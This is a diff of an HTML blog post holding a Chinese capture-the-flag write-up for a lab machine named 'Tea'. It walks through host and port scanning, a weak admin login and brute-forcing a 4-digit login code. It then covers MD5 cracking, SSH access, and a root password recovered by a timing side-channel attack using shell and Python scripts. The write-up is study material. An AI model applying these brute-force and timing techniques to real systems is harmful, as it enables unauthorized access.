@@ -22,7 +22,7 @@
 <meta property="og:url" content="https://7r1UMPHK.github.io/post/nei-bu-_tea.html">
 <meta property="og:image" content="https://7r1UMPHK.github.io/image/20251025224622174.webp">
 <title>内部_tea</title>
-<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
+
 
 
 </head>
@@ -46,17 +46,7 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
     body {padding: 8px;}
     .postTitle{font-size:24px;}
 }
-.copy-feedback {
-    display: none;
-    position: absolute;
-    top: 10px;
-    right: 50px;
-    color: var(--color-fg-on-emphasis);
-    background-color: var(--color-fg-muted);
-    border-radius: 3px;
-    padding: 5px 8px;
-    font-size: 12px;
-}
+
 </style>
 
 
@@ -90,40 +80,43 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
     <div id="content">
 <div class="markdown-body" id="postBody"><h1><strong>一、信息收集</strong></h1>
 <h2><strong>1. 主机发现</strong></h2>
-<p>首先，在本地网络中使用 <code class="notranslate">arp-scan</code> 工具扫描存活主机，确定目标靶机的 IP 地址为 <code class="notranslate">192.168.205.244</code>。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~]
+<p>首先，在本地网络中使用 <code>arp-scan</code> 工具扫描存活主机，确定目标靶机的 IP 地址为 <code>192.168.205.244</code>。</p>
+<pre lang="bash"><code>┌──(kali㉿kali)-[~]
 └─$ sudo arp-scan -l
 ...
 192.168.205.244 08:00:27:9a:e3:28       PCS Systemtechnik GmbH
-...</pre></div>
+...
+</code></pre>
 <h2><strong>2. 端口与服务扫描</strong></h2>
-<p>使用 <code class="notranslate">nmap</code> 对目标主机进行全端口扫描，发现其开放了 22 (SSH) 和 80 (HTTP) 两个端口。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~]
+<p>使用 <code>nmap</code> 对目标主机进行全端口扫描，发现其开放了 22 (SSH) 和 80 (HTTP) 两个端口。</p>
+<pre lang="bash"><code>┌──(kali㉿kali)-[~]
 └─$ nmap -p- 192.168.205.244
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-04 09:03 EDT
-Nmap scan report <span class="pl-k">for</span> 192.168.205.244
+Nmap scan report for 192.168.205.244
 Host is up (0.000099s latency).
 Not shown: 65533 closed tcp ports (reset)
 PORT   STATE SERVICE
 22/tcp open  ssh
-80/tcp open  http</pre></div>
+80/tcp open  http
+</code></pre>
 <h2><strong>3. Web 服务探索</strong></h2>
-<p>访问 80 端口，页面显示一个域名 <code class="notranslate">tea.dsz</code>。</p>
-<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/def07ecce18cc0d7a280a5b540ccd4aa2c6fc047cc3f1e2ee91afaf124e0c203/687474703a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235303830343231303430383338362e77656270"><img src="https://camo.githubusercontent.com/def07ecce18cc0d7a280a5b540ccd4aa2c6fc047cc3f1e2ee91afaf124e0c203/687474703a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235303830343231303430383338362e77656270" alt="image-20250804210408103" data-canonical-src="http://7r1UMPHK.github.io/image/20250804210408386.webp" style="max-width: 100%;"></a></p>
-<p>使用 <code class="notranslate">gobuster</code> 进行目录爆破，发现 <code class="notranslate">/login.php</code> 页面。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~]
+<p>访问 80 端口，页面显示一个域名 <code>tea.dsz</code>。</p>
+<p><img src="http://7r1UMPHK.github.io/image/20250804210408386.webp" alt="image-20250804210408103" /></p>
+<p>使用 <code>gobuster</code> 进行目录爆破，发现 <code>/login.php</code> 页面。</p>
+<pre lang="bash"><code>┌──(kali㉿kali)-[~]
 └─$ gobuster dir -u http://192.168.205.244 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt
 ...
 /login.php            (Status: 200)
 /index.html           (Status: 200)
-...</pre></div>
-<p>访问 <code class="notranslate">http://192.168.205.244/login.php</code>，发现一个登录页面，提供多种登录方式。</p>
-<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/bcd93313a5c35dfe5be923badb6442becc284cae7d24978d77be0cb4cece5ecf/687474703a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235303830343231303631343036362e77656270"><img src="https://camo.githubusercontent.com/bcd93313a5c35dfe5be923badb6442becc284cae7d24978d77be0cb4cece5ecf/687474703a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235303830343231303631343036362e77656270" alt="image-20250804210613846" data-canonical-src="http://7r1UMPHK.github.io/image/20250804210614066.webp" style="max-width: 100%;"></a></p>
-<p>尝试了一下弱密码，发现<code class="notranslate">admin:admin</code>可以登录</p>
-<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/df5bf322f4bcd3c7c6f8a887e08a33b6e6058105f4c31cf4ea7b4324d321dcae/687474703a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235303830343231313133313632372e77656270"><img src="https://camo.githubusercontent.com/df5bf322f4bcd3c7c6f8a887e08a33b6e6058105f4c31cf4ea7b4324d321dcae/687474703a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235303830343231313133313632372e77656270" alt="image-20250804211131383" data-canonical-src="http://7r1UMPHK.github.io/image/20250804211131627.webp" style="max-width: 100%;"></a></p>
+...
+</code></pre>
+<p>访问 <code>http://192.168.205.244/login.php</code>，发现一个登录页面，提供多种登录方式。</p>
+<p><img src="http://7r1UMPHK.github.io/image/20250804210614066.webp" alt="image-20250804210613846" /></p>
+<p>尝试了一下弱密码，发现<code>admin:admin</code>可以登录</p>
+<p><img src="http://7r1UMPHK.github.io/image/20250804211131627.webp" alt="image-20250804211131383" /></p>
 <p>提供了四个用户名，其中前三个都是弱密码的用户名，忽略。lingmj是群成员的用户名，目标就是他</p>
 <p>那突破点可能就在验证码登录那了</p>
-<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/f07b38f488c9914f058d9402b72c680d0e3b3a47e9c1e33cbe49fe30ff3ba102/687474703a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235303830343231303632393234352e77656270"><img src="https://camo.githubusercontent.com/f07b38f488c9914f058d9402b72c680d0e3b3a47e9c1e33cbe49fe30ff3ba102/687474703a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235303830343231303632393234352e77656270" alt="image-20250804210629005" data-canonical-src="http://7r1UMPHK.github.io/image/20250804210629245.webp" style="max-width: 100%;"></a></p>
+<p><img src="http://7r1UMPHK.github.io/image/20250804210629245.webp" alt="image-20250804210629005" /></p>
 <h1><strong>二、初始访问</strong></h1>
 <h2><strong>1. 漏洞利用：验证码爆破</strong></h2>
 <p>页面提示可以使用邮箱和4位验证码进行登录。</p>
@@ -134,16 +127,16 @@ PORT   STATE SERVICE
 <ol>
 <li>拦截验证码登录的 POST 请求。</li>
 <li>将请求发送到 Intruder 模块。</li>
-<li>将验证码参数 <code class="notranslate">code</code> 设置为爆破点。</li>
+<li>将验证码参数 <code>code</code> 设置为爆破点。</li>
 <li>设置 Payload 为数字序列，范围从 0000 到 9999。</li>
 </ol>
 </li>
 </ul>
-<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/528d3086a35b6cd80efa56fd66cc699478684a9f90ecb2ec272d174cbe1c559e/687474703a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235303830343231313335383335322e77656270"><img src="https://camo.githubusercontent.com/528d3086a35b6cd80efa56fd66cc699478684a9f90ecb2ec272d174cbe1c559e/687474703a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235303830343231313335383335322e77656270" alt="image-20250804211358010" data-canonical-src="http://7r1UMPHK.github.io/image/20250804211358352.webp" style="max-width: 100%;"></a></p>
-<p>成功爆破出验证码为 <code class="notranslate">8379</code>。使用该验证码成功登录。</p>
+<p><img src="http://7r1UMPHK.github.io/image/20250804211358352.webp" alt="image-20250804211358010" /></p>
+<p>成功爆破出验证码为 <code>8379</code>。使用该验证码成功登录。</p>
 <h3><strong>2. 获取 Shell</strong></h3>
 <p>登录后，页面显示了三个用户名（Black, Red, Flower）及其对应的 MD5 哈希密码。</p>
-<pre lang="text" class="notranslate"><code class="notranslate">Black
+<pre lang="text"><code>Black
 83796a396478e084663c06aa25425864
 Red
 d390587c3997d1f6b4e4fe968327e3a2
@@ -152,140 +145,149 @@ Flower
 </code></pre>
 <p>使用在线 MD5 解密工具，成功破解出明文密码：</p>
 <ul>
-<li><code class="notranslate">83796a396478e084663c06aa25425864</code> -&gt; <code class="notranslate">1234hak54321</code></li>
-<li><code class="notranslate">d390587c3997d1f6b4e4fe968327e3a2</code> -&gt; <code class="notranslate">123bugme</code></li>
-<li><code class="notranslate">3c96be08e8b399d1b990f2f5c4939f8b</code> -&gt; <code class="notranslate">Cartman</code></li>
+<li><code>83796a396478e084663c06aa25425864</code> -&gt; <code>1234hak54321</code></li>
+<li><code>d390587c3997d1f6b4e4fe968327e3a2</code> -&gt; <code>123bugme</code></li>
+<li><code>3c96be08e8b399d1b990f2f5c4939f8b</code> -&gt; <code>Cartman</code></li>
 </ul>
-<p>尝试使用这些凭据通过 SSH 登录。用户 <code class="notranslate">black</code> 和密码 <code class="notranslate">1234hak54321</code> 登录成功。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~]
+<p>尝试使用这些凭据通过 SSH 登录。用户 <code>black</code> 和密码 <code>1234hak54321</code> 登录成功。</p>
+<pre lang="bash"><code>┌──(kali㉿kali)-[~]
 └─$ ssh black@192.168.205.244
-black@192.168.205.244<span class="pl-s"><span class="pl-pds">'</span>s password:</span>
-<span class="pl-s">...</span>
-<span class="pl-s">black@Tea:~$ id</span>
-<span class="pl-s">uid=1000(black) gid=1000(black) groups=1000(black)</span></pre></div>
-<p>登录后，在 <code class="notranslate">/home/red/</code> 目录下发现 <code class="notranslate">user.txt</code> 文件，并成功读取第一个 flag。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">black@Tea:<span class="pl-k">~</span>$ cat /home/red/user.txt
-flag{user-9667c39f-4203-11f0-9e29-000c2955ba04}</pre></div>
+black@192.168.205.244's password:
+...
+black@Tea:~$ id
+uid=1000(black) gid=1000(black) groups=1000(black)
+</code></pre>
+<p>登录后，在 <code>/home/red/</code> 目录下发现 <code>user.txt</code> 文件，并成功读取第一个 flag。</p>
+<pre lang="bash"><code>black@Tea:~$ cat /home/red/user.txt
+flag{user-9667c39f-4203-11f0-9e29-000c2955ba04}
+</code></pre>
 <h1><strong>三、权限提升</strong></h1>
 <h2><strong>垂直提升：black -&gt; root</strong></h2>
-<p>在 <code class="notranslate">/opt</code> 目录下发现一个名为 <code class="notranslate">check_root_passwd</code> 的可执行文件。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">black@Tea:<span class="pl-k">~</span>$ ls -al /opt
--rwx--x--x 1 root root 16808 Jun 5 08:07 check_root_passwd</pre></div>
-<p>执行该程序并提供任意输入，均返回 "Password error"。通过 <code class="notranslate">time</code> 命令测试发现，输入特定长度（10位）时，程序的执行时间有显著延迟，这表明存在时间侧信道攻击的可能性。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">black@Tea:/opt$ <span class="pl-k">for</span> <span class="pl-smi">len</span> <span class="pl-k">in</span> {1..12}<span class="pl-k">;</span> <span class="pl-k">do</span> inp=<span class="pl-s"><span class="pl-pds">$(</span>printf <span class="pl-s"><span class="pl-pds">'</span>a%.0s<span class="pl-pds">'</span></span> <span class="pl-s"><span class="pl-pds">$(</span>seq 1 <span class="pl-smi">$len</span><span class="pl-pds">)</span></span><span class="pl-pds">)</span></span><span class="pl-k">;</span> <span class="pl-c1">printf</span> <span class="pl-s"><span class="pl-pds">"</span>Len:%2d -&gt; <span class="pl-pds">"</span></span> <span class="pl-smi">$len</span><span class="pl-k">;</span> (time ./check_root_passwd <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$inp</span><span class="pl-pds">"</span></span> <span class="pl-k">&gt;</span> /dev/null <span class="pl-k">2&gt;&amp;1</span>) <span class="pl-k">2&gt;&amp;1</span> <span class="pl-k">|</span> grep -o <span class="pl-s"><span class="pl-pds">'</span>real.*<span class="pl-pds">'</span></span><span class="pl-k">;</span> <span class="pl-k">done</span>
-Len: 1 -<span class="pl-k">&gt;</span> real    0m0.000s
+<p>在 <code>/opt</code> 目录下发现一个名为 <code>check_root_passwd</code> 的可执行文件。</p>
+<pre lang="bash"><code>black@Tea:~$ ls -al /opt
+-rwx--x--x 1 root root 16808 Jun 5 08:07 check_root_passwd
+</code></pre>
+<p>执行该程序并提供任意输入，均返回 &quot;Password error&quot;。通过 <code>time</code> 命令测试发现，输入特定长度（10位）时，程序的执行时间有显著延迟，这表明存在时间侧信道攻击的可能性。</p>
+<pre lang="bash"><code>black@Tea:/opt$ for len in {1..12}; do inp=$(printf 'a%.0s' $(seq 1 $len)); printf &quot;Len:%2d -&gt; &quot; $len; (time ./check_root_passwd &quot;$inp&quot; &gt; /dev/null 2&gt;&amp;1) 2&gt;&amp;1 | grep -o 'real.*'; done
+Len: 1 -&gt; real    0m0.000s
 ...
-Len: 9 -<span class="pl-k">&gt;</span> real    0m0.000s
-Len:10 -<span class="pl-k">&gt;</span> real    0m0.201s
-Len:11 -<span class="pl-k">&gt;</span> real    0m0.000s
-Len:12 -<span class="pl-k">&gt;</span> real    0m0.000s</pre></div>
+Len: 9 -&gt; real    0m0.000s
+Len:10 -&gt; real    0m0.201s
+Len:11 -&gt; real    0m0.000s
+Len:12 -&gt; real    0m0.000s
+</code></pre>
 <p>基于此发现，可以编写脚本逐位爆破密码。其原理是：程序逐字符比较输入与真实密码，每正确一位，比较时间就会稍长一些。通过测量每个字符的响应时间，可以确定正确的密码。</p>
 <p>使用以下 Shell 脚本进行爆破：（这脚本ai写的，巨慢）</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">P=<span class="pl-s"><span class="pl-pds">"</span><span class="pl-pds">"</span></span>
-<span class="pl-k">for</span> <span class="pl-smi">p</span> <span class="pl-k">in</span> {0..9}<span class="pl-k">;</span> <span class="pl-k">do</span>
-    LOG=/tmp/log.<span class="pl-smi">$p</span>
-    <span class="pl-k">for</span> <span class="pl-smi">c</span> <span class="pl-k">in</span> {a..z}<span class="pl-k">;</span> <span class="pl-k">do</span>
-        inp=<span class="pl-s"><span class="pl-pds">$(</span>printf <span class="pl-s"><span class="pl-pds">"</span>%-10s<span class="pl-pds">"</span></span> <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$P$c</span><span class="pl-pds">"</span></span> <span class="pl-k">|</span> tr <span class="pl-s"><span class="pl-pds">'</span> <span class="pl-pds">'</span></span> a <span class="pl-k">|</span> cut -c1-10<span class="pl-pds">)</span></span>
-        t=<span class="pl-s"><span class="pl-pds">$(</span> { <span class="pl-k">time</span> /opt/check_root_passwd <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$inp</span><span class="pl-pds">"</span></span> <span class="pl-k">&gt;</span>/dev/null <span class="pl-k">2&gt;&amp;1</span><span class="pl-k">;</span> } <span class="pl-k">2&gt;&amp;1</span> <span class="pl-k">|</span> grep real <span class="pl-k">|</span> awk -F<span class="pl-s"><span class="pl-pds">'</span>m<span class="pl-pds">'</span></span> <span class="pl-s"><span class="pl-pds">'</span>{gsub(/s/,"",$2); print $2}<span class="pl-pds">'</span></span> <span class="pl-pds">)</span></span>
-        <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$c</span> <span class="pl-smi">$t</span><span class="pl-pds">"</span></span> <span class="pl-k">&gt;&gt;</span> <span class="pl-smi">$LOG</span>
-    <span class="pl-k">done</span>
-    B=<span class="pl-s"><span class="pl-pds">$(</span>sort -k2 -nr <span class="pl-smi">$LOG</span> <span class="pl-k">|</span> head -1 <span class="pl-k">|</span> awk <span class="pl-s"><span class="pl-pds">'</span>{print $1}<span class="pl-pds">'</span></span><span class="pl-pds">)</span></span>
-    P+=<span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$B</span><span class="pl-pds">"</span></span>
-    <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>p<span class="pl-smi">$p</span>: <span class="pl-smi">$B</span> | total: <span class="pl-smi">$P</span><span class="pl-pds">"</span></span>
-<span class="pl-k">done</span>
-<span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$P</span><span class="pl-pds">"</span></span></pre></div>
-<p>经过爆破，得到 root 密码为 <code class="notranslate">toddzhennb</code>。</p>
+<pre lang="bash"><code>P=&quot;&quot;
+for p in {0..9}; do
+    LOG=/tmp/log.$p
+    for c in {a..z}; do
+        inp=$(printf &quot;%-10s&quot; &quot;$P$c&quot; | tr ' ' a | cut -c1-10)
+        t=$( { time /opt/check_root_passwd &quot;$inp&quot; &gt;/dev/null 2&gt;&amp;1; } 2&gt;&amp;1 | grep real | awk -F'm' '{gsub(/s/,&quot;&quot;,$2); print $2}' )
+        echo &quot;$c $t&quot; &gt;&gt; $LOG
+    done
+    B=$(sort -k2 -nr $LOG | head -1 | awk '{print $1}')
+    P+=&quot;$B&quot;
+    echo &quot;p$p: $B | total: $P&quot;
+done
+echo &quot;$P&quot;
+</code></pre>
+<p>经过爆破，得到 root 密码为 <code>toddzhennb</code>。</p>
 <h1><strong>四、夺取旗帜</strong></h1>
-<p>使用破解出的密码切换到 <code class="notranslate">root</code> 用户。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">black@Tea:/tmp$ su -
+<p>使用破解出的密码切换到 <code>root</code> 用户。</p>
+<pre lang="bash"><code>black@Tea:/tmp$ su -
 Password: toddzhennb
-root@Tea:<span class="pl-k">~</span><span class="pl-c"><span class="pl-c">#</span> id</span>
-uid=0(root) gid=0(root) groups=0(root)</pre></div>
+root@Tea:~# id
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre>
 <p>最后，读取 flag，完成渗透。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">root@Tea:<span class="pl-k">~</span><span class="pl-c"><span class="pl-c">#</span> cat /root/root.txt /home/red/user.txt </span>
+<pre lang="bash"><code>root@Tea:~# cat /root/root.txt /home/red/user.txt 
 flag{root-06a5f218-4203-11f0-918d-000c2955ba04}
-flag{user-9667c39f-4203-11f0-9e29-000c2955ba04}</pre></div>
+flag{user-9667c39f-4203-11f0-9e29-000c2955ba04}
+</code></pre>
 <h1>五、题外话</h1>
 <p>我打完才发现，这靶机群主叫我测试过</p>
 <p>然后他的根目录有一个脚本，比我这快多了，想了解一下的看下面</p>
-<div class="highlight highlight-source-python"><pre class="notranslate"><span class="pl-s1">root</span>@<span class="pl-v">Tea</span>:<span class="pl-c1">~</span><span class="pl-c"># cat solve.py </span>
-<span class="pl-k">import</span> <span class="pl-s1">subprocess</span>
-<span class="pl-k">import</span> <span class="pl-s1">sys</span>
-<span class="pl-k">import</span> <span class="pl-s1">time</span>
-<span class="pl-k">import</span> <span class="pl-s1">string</span>
+<pre lang="python"><code>root@Tea:~# cat solve.py 
+import subprocess
+import sys
+import time
+import string
 
-<span class="pl-c1">TARGET_PROGRAM</span> <span class="pl-c1">=</span> <span class="pl-s">"./a.out"</span>
-<span class="pl-c1">MAX_LENGTH</span> <span class="pl-c1">=</span> <span class="pl-c1">100</span>
-<span class="pl-c1">INITIAL_DELAY</span> <span class="pl-c1">=</span> <span class="pl-c1">0.2</span>
-<span class="pl-c1">CHAR_DELAY</span> <span class="pl-c1">=</span> <span class="pl-c1">0.05</span>
-<span class="pl-c1">TIMING_MARGIN</span> <span class="pl-c1">=</span> <span class="pl-c1">0.01</span>
-<span class="pl-c1">ATTEMPTS</span> <span class="pl-c1">=</span> <span class="pl-c1">2</span>
-<span class="pl-c1">DETECT_THRESHOLD</span> <span class="pl-c1">=</span> <span class="pl-c1">0.15</span>
-<span class="pl-c1">CHARSET</span> <span class="pl-c1">=</span> <span class="pl-s1">string</span>.<span class="pl-c1">ascii_lowercase</span> <span class="pl-c1">+</span> <span class="pl-s1">string</span>.<span class="pl-c1">digits</span>
+TARGET_PROGRAM = &quot;./a.out&quot;
+MAX_LENGTH = 100
+INITIAL_DELAY = 0.2
+CHAR_DELAY = 0.05
+TIMING_MARGIN = 0.01
+ATTEMPTS = 2
+DETECT_THRESHOLD = 0.15
+CHARSET = string.ascii_lowercase + string.digits
 
-<span class="pl-k">def</span> <span class="pl-en">run_password_test</span>(<span class="pl-s1">password</span>):
-    <span class="pl-s1">start_time</span> <span class="pl-c1">=</span> <span class="pl-s1">time</span>.<span class="pl-c1">perf_counter</span>()
-    <span class="pl-s1">process</span> <span class="pl-c1">=</span> <span class="pl-s1">subprocess</span>.<span class="pl-c1">Popen</span>(
-        [<span class="pl-c1">TARGET_PROGRAM</span>, <span class="pl-s1">password</span>],
-        <span class="pl-s1">stdout</span><span class="pl-c1">=</span><span class="pl-s1">subprocess</span>.<span class="pl-c1">PIPE</span>,
-        <span class="pl-s1">stderr</span><span class="pl-c1">=</span><span class="pl-s1">subprocess</span>.<span class="pl-c1">PIPE</span>
+def run_password_test(password):
+    start_time = time.perf_counter()
+    process = subprocess.Popen(
+        [TARGET_PROGRAM, password],
+        stdout=subprocess.PIPE,
+        stderr=subprocess.PIPE
     )
-    <span class="pl-s1">_</span>, <span class="pl-s1">_</span> <span class="pl-c1">=</span> <span class="pl-s1">process</span>.<span class="pl-c1">communicate</span>()
-    <span class="pl-k">return</span> <span class="pl-s1">time</span>.<span class="pl-c1">perf_counter</span>() <span class="pl-c1">-</span> <span class="pl-s1">start_time</span>
+    _, _ = process.communicate()
+    return time.perf_counter() - start_time
 
-<span class="pl-k">def</span> <span class="pl-en">detect_length</span>():
-    <span class="pl-k">for</span> <span class="pl-s1">length</span> <span class="pl-c1">in</span> <span class="pl-en">range</span>(<span class="pl-c1">1</span>, <span class="pl-c1">MAX_LENGTH</span> <span class="pl-c1">+</span> <span class="pl-c1">1</span>):
-        <span class="pl-s1">test_pwd</span> <span class="pl-c1">=</span> <span class="pl-s">'a'</span> <span class="pl-c1">*</span> <span class="pl-s1">length</span>
-        <span class="pl-s1">total_time</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>
-        <span class="pl-k">for</span> <span class="pl-s1">_</span> <span class="pl-c1">in</span> <span class="pl-en">range</span>(<span class="pl-c1">ATTEMPTS</span>):
-            <span class="pl-s1">elapsed</span> <span class="pl-c1">=</span> <span class="pl-en">run_password_test</span>(<span class="pl-s1">test_pwd</span>)
-            <span class="pl-s1">total_time</span> <span class="pl-c1">+=</span> <span class="pl-s1">elapsed</span>
-        <span class="pl-s1">avg_time</span> <span class="pl-c1">=</span> <span class="pl-s1">total_time</span> <span class="pl-c1">/</span> <span class="pl-c1">ATTEMPTS</span>
+def detect_length():
+    for length in range(1, MAX_LENGTH + 1):
+        test_pwd = 'a' * length
+        total_time = 0
+        for _ in range(ATTEMPTS):
+            elapsed = run_password_test(test_pwd)
+            total_time += elapsed
+        avg_time = total_time / ATTEMPTS
         
-        <span class="pl-k">if</span> <span class="pl-s1">avg_time</span> <span class="pl-c1">&gt;=</span> <span class="pl-c1">DETECT_THRESHOLD</span>:
-            <span class="pl-k">return</span> <span class="pl-s1">length</span>
+        if avg_time &gt;= DETECT_THRESHOLD:
+            return length
     
-    <span class="pl-en">print</span>(<span class="pl-s">"Password length not found (1-100)"</span>)
-    <span class="pl-s1">sys</span>.<span class="pl-c1">exit</span>(<span class="pl-c1">1</span>)
+    print(&quot;Password length not found (1-100)&quot;)
+    sys.exit(1)
 
-<span class="pl-k">def</span> <span class="pl-en">crack_password</span>(<span class="pl-s1">password_length</span>):
-    <span class="pl-s1">known</span> <span class="pl-c1">=</span> <span class="pl-s">""</span>
+def crack_password(password_length):
+    known = &quot;&quot;
     
-    <span class="pl-k">for</span> <span class="pl-s1">position</span> <span class="pl-c1">in</span> <span class="pl-en">range</span>(<span class="pl-s1">password_length</span>):
-        <span class="pl-s1">max_time</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>
-        <span class="pl-s1">best_char</span> <span class="pl-c1">=</span> <span class="pl-c1">None</span>
+    for position in range(password_length):
+        max_time = 0
+        best_char = None
         
-        <span class="pl-k">for</span> <span class="pl-s1">char</span> <span class="pl-c1">in</span> <span class="pl-c1">CHARSET</span>:
-            <span class="pl-s1">test_pwd</span> <span class="pl-c1">=</span> <span class="pl-s1">known</span> <span class="pl-c1">+</span> <span class="pl-s1">char</span> <span class="pl-c1">+</span> <span class="pl-s">'x'</span> <span class="pl-c1">*</span> (<span class="pl-s1">password_length</span> <span class="pl-c1">-</span> <span class="pl-en">len</span>(<span class="pl-s1">known</span>) <span class="pl-c1">-</span> <span class="pl-c1">1</span>)
+        for char in CHARSET:
+            test_pwd = known + char + 'x' * (password_length - len(known) - 1)
             
-            <span class="pl-s1">current_time</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>
-            <span class="pl-k">for</span> <span class="pl-s1">_</span> <span class="pl-c1">in</span> <span class="pl-en">range</span>(<span class="pl-c1">ATTEMPTS</span>):
-                <span class="pl-s1">elapsed</span> <span class="pl-c1">=</span> <span class="pl-en">run_password_test</span>(<span class="pl-s1">test_pwd</span>)
-                <span class="pl-k">if</span> <span class="pl-s1">elapsed</span> <span class="pl-c1">&gt;</span> <span class="pl-s1">current_time</span>:
-                    <span class="pl-s1">current_time</span> <span class="pl-c1">=</span> <span class="pl-s1">elapsed</span>
+            current_time = 0
+            for _ in range(ATTEMPTS):
+                elapsed = run_password_test(test_pwd)
+                if elapsed &gt; current_time:
+                    current_time = elapsed
             
-            <span class="pl-en">print</span>(<span class="pl-s">f"Testing '<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">char</span><span class="pl-kos">}</span></span>': <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">current_time</span>:.4f<span class="pl-kos">}</span></span>s"</span>)
+            print(f&quot;Testing '{char}': {current_time:.4f}s&quot;)
             
-            <span class="pl-k">if</span> <span class="pl-s1">current_time</span> <span class="pl-c1">&gt;</span> <span class="pl-s1">max_time</span>:
-                <span class="pl-s1">max_time</span> <span class="pl-c1">=</span> <span class="pl-s1">current_time</span>
-                <span class="pl-s1">best_char</span> <span class="pl-c1">=</span> <span class="pl-s1">char</span>
+            if current_time &gt; max_time:
+                max_time = current_time
+                best_char = char
         
-        <span class="pl-s1">expected_time</span> <span class="pl-c1">=</span> <span class="pl-c1">INITIAL_DELAY</span> <span class="pl-c1">+</span> (<span class="pl-s1">position</span> <span class="pl-c1">+</span> <span class="pl-c1">1</span>) <span class="pl-c1">*</span> <span class="pl-c1">CHAR_DELAY</span>
-        <span class="pl-k">if</span> <span class="pl-en">abs</span>(<span class="pl-s1">max_time</span> <span class="pl-c1">-</span> <span class="pl-s1">expected_time</span>) <span class="pl-c1">&gt;</span> <span class="pl-c1">TIMING_MARGIN</span>:
-            <span class="pl-en">print</span>(<span class="pl-s">f"Warning: Position <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">position</span><span class="pl-kos">}</span></span> timing anomaly (<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">max_time</span>:.4f<span class="pl-kos">}</span></span>s vs expected <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">expected_time</span>:.4f<span class="pl-kos">}</span></span>s)"</span>)
+        expected_time = INITIAL_DELAY + (position + 1) * CHAR_DELAY
+        if abs(max_time - expected_time) &gt; TIMING_MARGIN:
+            print(f&quot;Warning: Position {position} timing anomaly ({max_time:.4f}s vs expected {expected_time:.4f}s)&quot;)
         
-        <span class="pl-s1">known</span> <span class="pl-c1">+=</span> <span class="pl-s1">best_char</span>
-        <span class="pl-en">print</span>(<span class="pl-s">f"Progress: <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">known</span><span class="pl-kos">}</span></span>"</span>)
+        known += best_char
+        print(f&quot;Progress: {known}&quot;)
     
-    <span class="pl-k">return</span> <span class="pl-s1">known</span>
+    return known
 
-<span class="pl-k">if</span> <span class="pl-s1">__name__</span> <span class="pl-c1">==</span> <span class="pl-s">"__main__"</span>:
-    <span class="pl-en">print</span>(<span class="pl-s">"Starting password cracker..."</span>)
-    <span class="pl-en">print</span>(<span class="pl-s">"Detecting password length..."</span>)
-    <span class="pl-s1">password_length</span> <span class="pl-c1">=</span> <span class="pl-en">detect_length</span>()
-    <span class="pl-en">print</span>(<span class="pl-s">f"Password length detected: <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">password_length</span><span class="pl-kos">}</span></span>"</span>)
-    <span class="pl-s1">password</span> <span class="pl-c1">=</span> <span class="pl-en">crack_password</span>(<span class="pl-s1">password_length</span>)
-    <span class="pl-en">print</span>(<span class="pl-s">f"<span class="pl-cce">\n</span>Password found: <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">password</span><span class="pl-kos">}</span></span>"</span>)</pre></div></div>
+if __name__ == &quot;__main__&quot;:
+    print(&quot;Starting password cracker...&quot;)
+    print(&quot;Detecting password length...&quot;)
+    password_length = detect_length()
+    print(f&quot;Password length detected: {password_length}&quot;)
+    password = crack_password(password_length)
+    print(f&quot;\nPassword found: {password}&quot;)
+</code></pre>
+</div>
 <div style="font-size:small;margin-top:8px;float:right;"></div>
 
 <button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
@@ -310,7 +312,7 @@ if(""!=""){
 </script></div>
 </body>
 <script>
